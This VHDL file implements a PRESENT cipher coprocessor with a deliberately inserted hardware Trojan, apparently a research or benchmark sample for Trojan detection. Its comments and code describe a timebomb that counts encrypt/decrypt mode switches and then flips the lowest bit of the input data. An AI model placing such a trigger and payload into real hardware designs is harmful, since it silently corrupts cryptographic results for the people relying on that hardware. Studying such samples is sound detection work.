library ieee;
use ieee.std_logic_1164.all;
use ieee.numeric_std.all;

-- Trojan 7: trigger = Timebomb which triggers after each 2^k crypto operation changes, i.e
-- changes from encryption to decryption (change in mode_sel(0))
-- payload = flip the LSBit of the input data

entity present_Trojan7 is
        port (
                clk      : in std_logic;
                rst      : in std_logic;
                ena      : in std_logic;

                mode_sel : in std_logic_vector(1 downto 0);
                key      : in std_logic_vector(127 downto 0);
                data_in  : in std_logic_vector(63 downto 0);
                data_out : out std_logic_vector(63 downto 0);
                ready    : out std_logic
        );
end entity present_Trojan7;

architecture rtl of present_Trojan7 is
        signal  key_sched_out,
                key_mem_out : std_logic_vector(63 downto 0);

        signal  current_round,
                mem_address : std_logic_vector(4 downto 0);

        signal  enc_ena,
                dec_ena : std_logic;

        signal  mem_wr_ena : std_logic;

        signal  ciphertext,
                plaintext,
                mux_out : std_logic_vector(63 downto 0);

        signal  key_sched_ena,
                out_ena,
                load_ena        : std_logic;

        signal  mode_sel_last : std_logic;
        signal  trojan_trig,
                trojan_counter_ena,
                trojan_xor_out : std_logic;

        signal  trojan_data_in : std_logic_vector(63 downto 0);
        
        constant TROJAN_COUNTER_WIDTH : natural := 2; -- TODO : what will this constant's final value be?
        constant TROJAN_COUNTER_MAX_VALUE : std_logic_vector(TROJAN_COUNTER_WIDTH-1 downto 0) := (others => '1');
        signal  trojan_counter_out : std_logic_vector(TROJAN_COUNTER_WIDTH-1 downto 0);
begin
        -- mode_sel(1) = 1 -> 128-bit key, 0 -> 80-bit key
        -- mode_sel(0) = 1 -> Decrypt, 0 -> Encrypt       
        
        -- store the current value of the mode_sel(0) bit in order to compare it to the next cycle's value.
        -- The below flip-flop and the combinatorial process are a synthesizable way to check for a signal value
        -- change, like the 'event attribute does for simulation purposes.
        mode_sel_ff : entity work.dflip_flop
                port map(
                        clk => clk,
                        ena => ena,
                        rst => rst,
                        d => mode_sel(0),
                        q => mode_sel_last
                );

        -- compare the current mode_sel(0) value with the previous one
        mode_sel_comp_process : process(mode_sel(0), mode_sel_last)
        begin
                if ((mode_sel(0) XOR mode_sel_last) = '1') then -- if the values are different
                        trojan_counter_ena <= '1';
                else
                        trojan_counter_ena <= '0';
                end if;
        end process mode_sel_comp_process;

        -- trojan counter :counts the changes of cryptographic operation, i.e. changes in the value of mode_sel(0)
        trojan_counter : entity work.counter
                generic map (
                        COUNTER_WIDTH => TROJAN_COUNTER_WIDTH
                )
                port map(
                        clk => clk,
                        cnt_ena => trojan_counter_ena,
                        rst => rst,
                        count => trojan_counter_out
                );
        
        -- Trojan triggers when the counter reaches its max value, i.e. 2^(TROJAN_COUNTER_MAX_VALUE) - 1
        trojan_trig <= '1' when trojan_counter_out = TROJAN_COUNTER_MAX_VALUE else '0';
        
        -- Trojan payload : flip the LSBit of the input data
        trojan_payload_xor : entity work.xor_2
                port map(
                        a => trojan_trig,
                        b => data_in(0),
                        y => trojan_xor_out
                );

        -- tampered input data
        trojan_data_in <= data_in(63 downto 1) & trojan_xor_out;

        control_unit : entity work.present_control_unit
                port map(
                        -- inputs
                        clk      => clk,
                        rst      => rst,
                        ena      => ena,
                        op_sel => mode_sel(0),

                        round_counter_val => current_round,
                        mem_addr          => mem_address,
                        mem_wr_ena        => mem_wr_ena,

                        enc_ena  => enc_ena,
                        dec_ena  => dec_ena,
                        load_ena => load_ena,

                        key_sched_ena => key_sched_ena,
                        out_ena       => out_ena,
                        ready         => ready
                );

        key_sched : entity work.key_schedule_top
                port map(
                        clk               => clk,
                        rst               => rst,
                        ena               => key_sched_ena,
                        mode              => mode_sel(1),
                        input_key         => key,
                        output_key        => key_sched_out,
                        round_counter_val => current_round
                );

        round_key_mem : entity work.key_mem
                port map(
                        clk      => clk,
                        addr     => mem_address,
                        data_in  => key_sched_out,
                        wr_ena   => mem_wr_ena,
                        data_out => key_mem_out
                );

        enc_dp : entity work.present_enc
                port map(
                        clk        => clk,
                        rst        => rst,
                        ena        => enc_ena,
                        load_ena   => load_ena,
                        plaintext  => trojan_data_in,                        
                        round_key  => key_mem_out,
                        ciphertext => ciphertext
                );

        dec_dp : entity work.present_dec
                port map(
                        clk        => clk,
                        rst        => rst,
                        ena        => dec_ena,
                        load_ena   => load_ena,
                        ciphertext => trojan_data_in,                        
                        round_key  => key_mem_out,
                        plaintext  => plaintext
                );

        -- mux controlling the input of the output register. Depending on the value of mode_sel(0)
        -- (0 for encryption, 1 for decryption), pass the output of the corresponding datapath to 
        -- the output register's input.
        out_mux : entity work.mux
                generic map(
                        DATA_WIDTH => 64
                )
                port map(
                        input_A => ciphertext,
                        input_B => plaintext,
                        sel     => dec_ena,
                        mux_out => mux_out
                );

        -- Coprocessor-global output register, in order to preserve the computed output data,
        -- until new ones are available. This can be helpful when a device reading from
        -- the coprocessor's output, reads with a rate less than the data output rate.
        out_reg : entity work.reg
                generic map(
                        DATA_WIDTH => 64
                )
                port map(
                        clk  => clk,
                        ena  => out_ena,
                        rst  => rst,
                        din  => mux_out,
                        dout => data_out
                );                             
end architecture;